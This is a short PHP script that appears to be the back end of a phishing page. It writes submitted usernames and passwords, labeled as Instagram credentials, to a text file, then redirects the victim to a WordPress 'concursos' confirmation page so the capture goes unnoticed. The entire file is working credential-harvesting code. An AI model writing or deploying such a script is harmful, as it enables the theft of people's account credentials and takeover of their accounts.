<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://concursosecuadordesign.wordpress.com/confirmacion/?preview=true');
exit();
?>
